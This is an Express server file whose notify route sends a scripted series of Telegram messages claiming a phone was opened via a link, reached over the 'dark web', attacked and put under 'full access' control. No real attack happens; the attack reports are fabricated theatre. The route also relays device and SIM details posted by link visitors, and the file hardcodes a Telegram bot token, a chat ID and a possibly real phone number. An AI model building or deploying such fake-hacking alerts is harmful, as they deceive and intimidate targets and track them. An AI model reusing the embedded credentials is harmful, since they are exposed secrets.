import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  try {
    const app = express();
    const PORT = 3000;

    app.use(express.json());

    console.log("[SERVER] Starting server initialization...");

    // Health check route
    app.get("/api/health", (req, res) => {
      res.json({ status: "ok" });
    });

    console.log("[SERVER] Health check route initialized.");

  // API Route to notify Telegram
  app.post("/api/notify", async (req, res) => {
    const { step, deviceModel, simNumber, userAgent } = req.body;
    
    // Updated Telegram Credentials
    const botToken = "8667560742:AAGa4YHCuFVuAi7CZTKV6TpkZ469nP4dgSo";
    const chatId = "8039370191";

    console.log(`[SYSTEM] Notification request received for step ${step}. Using Bot Token: ${botToken.substring(0, 10)}... and Chat ID: ${chatId}`);

    if (!botToken || !chatId) {
      console.error("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing");
      return res.status(500).json({ error: "Server configuration error" });
    }

    let message = "";
    const model = deviceModel || "iPhone 15 Pro Max";
    const sim = simNumber || "01797837149";

    if (step === 1) {
      message = `
<b>📱 Device Information</b>
━━━━━━━━━━━━━━━━━━━━
<b>Model:</b> ${model}
<b>Manufacturer:</b> Apple Inc.
<b>Address:</b> One Apple Park Way, Cupertino, CA 95014, USA
<b>User Agent:</b> Linux PC
━━━━━━━━━━━━━━━━━━━━
<b>✅ Link Opened:</b> ${sim}
      `.trim();
    } else if (step === 2) {
      message = `
<b>🌑 DARK WEB ACCESS</b>
━━━━━━━━━━━━━━━━━━━━
<b>Target:</b> ${model}
<b>Source:</b> Dark Web (Tor Network)
<b>Status:</b> Accessing...
<b>Location:</b> Saudi Arabia 🇸🇦
━━━━━━━━━━━━━━━━━━━━
<b>💻 System:</b> Linux PC
      `.trim();
    } else if (step === 3) {
      message = `
<b>⚡ ATTACK INITIATED</b>
━━━━━━━━━━━━━━━━━━━━
<b>Target:</b> ${model} / SIM
<b>SIM Number:</b> ${sim}
<b>Action:</b> Device-এর access নেওয়া হচ্ছে
━━━━━━━━━━━━━━━━━━━━
<b>⚠️ Phone-এ attack গেছে</b>
      `.trim();
    } else if (step === 4) {
      message = `
<b>💀 CONTROL ESTABLISHED</b>
━━━━━━━━━━━━━━━━━━━━
<b>Target:</b> ${model}
<b>Server:</b> WORKING
<b>Control:</b> FULL ACCESS
<b>Status:</b> Device access successfully taken.
━━━━━━━━━━━━━━━━━━━━
      `.trim();
    }

    try {
      console.log(`Sending notification for step ${step} to Telegram...`);
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      });

      const result = await response.json();
      if (!response.ok) {
        console.error("Telegram API Error Response:", result);
        return res.status(500).json({ error: "Failed to send notification", details: result });
      }

      console.log("Telegram message sent successfully");
      res.json({ success: true });
    } catch (error) {
      console.error("Error sending notification:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

    app.listen(PORT, "0.0.0.0", () => {
      console.log(`[SERVER] Server running on http://localhost:${PORT}`);
    });
  } catch (error) {
    console.error("[SERVER] Error during server initialization:", error);
    throw error;
  }
}

startServer().catch((err) => {
  console.error("[SERVER] Fatal error during startup:", err);
  process.exit(1);
});
